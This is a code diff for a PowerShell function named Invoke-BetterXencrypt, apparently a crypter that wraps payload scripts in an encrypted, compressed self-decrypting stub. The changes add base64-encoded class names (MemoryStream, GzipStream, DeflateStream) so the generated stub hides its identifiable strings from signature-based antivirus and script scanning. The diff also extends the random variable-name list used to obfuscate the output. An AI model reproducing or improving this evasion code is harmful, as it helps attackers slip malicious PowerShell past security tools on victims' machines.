@@ -228,15 +228,18 @@ function Invoke-BetterXencrypt {
             $stub_template += $code_alternatives -join ''
 
             $code_alternatives  = @()
-            $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
-            $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
+            $code_alternatives += '${34} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))' + "`r`n"
+            $code_alternatives += '${6} = New-Object ${34}(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
+            $code_alternatives += '${7} = New-Object ${34}' + "`r`n"
             $stub_template += $code_alternatives -join ''
 
 
             if ($compressiontype -eq "Gzip") {
-                $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
+                $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))'    + "`r`n"
+                $stub_template += '${5} = New-Object ${35} ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
             } elseif ( $compressiontype -eq "Deflate") {
-                $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
+                $stub_template += '${35} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))'    + "`r`n"
+                $stub_template += '${5} = New-Object ${35} ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
             }
             $stub_template += '${5}.CopyTo(${7})' + "`r`n"
 
@@ -255,7 +258,7 @@ function Invoke-BetterXencrypt {
             
         
             # it's ugly, but it beats concatenating each value manually.
-            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
+            [string]$code = $stub_template -f $b64encryptedreversed, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
             $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
         }
         Write-Output "[*] Writing '$($outfile)' ..."
